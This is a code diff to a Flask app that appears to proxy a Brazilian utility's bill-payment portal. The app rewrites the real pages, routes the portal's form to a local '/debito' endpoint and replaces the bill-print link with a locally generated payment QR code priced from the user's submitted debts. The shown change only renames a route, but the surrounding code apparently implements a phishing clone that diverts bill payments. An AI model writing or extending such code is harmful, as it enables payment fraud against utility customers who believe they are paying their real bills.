@@ -24,7 +24,7 @@ def init_app(app):
             response = response.replace('js/', '/static/js/')
             response = response.replace('imagens/', '/static/imagens/')
             response = response.replace('css/', '/static/css/')
-            response = response.replace('scripts/redirect.php', '/redirect')
+            response = response.replace('scripts/redirect.php', '/debito')
             response = re.sub(
                 r'data:image.+?">',
                 "/static/imagens/logo.png'>",
@@ -33,8 +33,8 @@ def init_app(app):
             )
             return response
 
-    @app.post('/redirect')
-    def redirect_view():
+    @app.post('/debito')
+    def debito():
         with Client(timeout=10000) as client:
             response = client.post(
                 'http://autoatendimento.prosanearinfo.com.br/v5.1/scripts/redirect.php',
@@ -84,7 +84,7 @@ def init_app(app):
                 response = response.replace('imagens/', '/static/imagens/')
                 response = response.replace('css/', '/static/css/')
                 response = response.replace(
-                    'scripts/redirect.php', '/redirect'
+                    'scripts/redirect.php', '/debito'
                 )
                 response = response.replace(
                     'javascript:imprimirConta(0)', '/qrcode'
@@ -114,7 +114,7 @@ def init_app(app):
                 payload=payload.payload_completa,
                 price=request.form['debitos'],
             )
-        return redirect(url_for('redirect_view'))
+        return redirect(url_for('debito'))
 
     @app.route('/login', methods=['GET', 'POST'])
     def login():
